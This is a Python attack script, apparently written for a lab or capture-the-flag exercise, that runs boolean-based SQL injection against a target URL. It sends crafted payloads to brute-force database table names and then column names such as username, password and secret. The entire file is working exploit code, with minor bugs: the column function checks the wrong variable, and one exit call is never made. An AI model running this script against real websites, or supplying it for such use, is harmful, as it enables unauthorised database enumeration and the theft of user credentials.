import sys
import requests

def usage():
    print(f"""
Usage: {sys.argv[0]} <url>

This script uses boolean-based SQL injection to brute force table names and column names.

Arguments:
  url    - The root URL where the sql injections takes place. Starts with http:// and ends in /
""")
    sys.exit(1)

def enumerate_tables(url):
    table_wordlist = ["alksdalk", "123qsd", "users", "apple"]

    # Test if our boolean works (i.e., we can tell true from false)
    matched_payload = f"a' OR 1 not like 0-- -/"
    matched_payload = replace_spaces(matched_payload)
    matched = requests.get(url + matched_payload)

    # Using random table name to simulate failure
    unmatched_payload = f"a' OR (SELECT 1 FROM ao1mc7whax LIMIT 1) LIKE 1-- -/"
    unmatched_payload = replace_spaces(unmatched_payload)
    unmatched = requests.get(url + unmatched_payload)

    if matched.text == unmatched.text:
        raise Exception(f"Cannot tell true from false for boolean injection")

    # Brute force table names and store succesful ones
    valid_tables = []
    for table_name in table_wordlist:
        loop_payload = f"a' OR (SELECT 1 FROM {table_name} LIMIT 1) LIKE 1-- -/"
        loop_payload = replace_spaces(loop_payload)
        r = requests.get(url + loop_payload)
        if r.text != unmatched.text:
            valid_tables.append(table_name)

    if valid_tables:
        return valid_tables
    else:
        raise Exception(f"Could not find any valid table names")

def enumerate_columns(url, table):
    column_wordlist = ["users", "username", "usernames", "id", "ID", "email", "pass", "password", "secret"]

    # Test if our boolean works (i.e., we can tell true from false)
    matched_payload = f"a' OR 1 not like 0-- -/"
    matched_payload = replace_spaces(matched_payload)
    matched = requests.get(url + matched_payload)

    # Using random column name to simulate failure
    unmatched_payload = f"a' OR (SELECT ao3kcis9ruw1 FROM {table} LIMIT 1) LIKE 1-- -/"
    unmatched_payload = replace_spaces(unmatched_payload)
    unmatched = requests.get(url + unmatched_payload)

    if matched.text == unmatched.text:
        raise Exception(f"Cannot tell true from false for boolean injection")

    # Brute force table names and store succesful ones
    valid_columns = []
    for column_name in column_wordlist:
        loop_payload = f"a' OR (SELECT {column_name} FROM {table} LIMIT 1) LIKE 1-- -/"
        loop_payload = replace_spaces(loop_payload)
        r = requests.get(url + loop_payload)
        if r.text != unmatched.text:
            valid_columns.append(column_name)

    if valid_tables:
        return valid_columns
    else:
        raise Exception(f"Could not find any valid column names")

def replace_spaces(command: str) -> str:
    return command.replace(" ", "%20")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        usage()
        exit
    else:
        url = sys.argv[1]
    
    print("Enumerating tables...")
    valid_tables = enumerate_tables(url)
    print(f"Found the following tables:")
    for table in valid_tables:
        print(table)

    for table in valid_tables:
        print(f"Enumerating columns for table {table}...")
        valid_columns = enumerate_columns(url, table)
        print(valid_columns)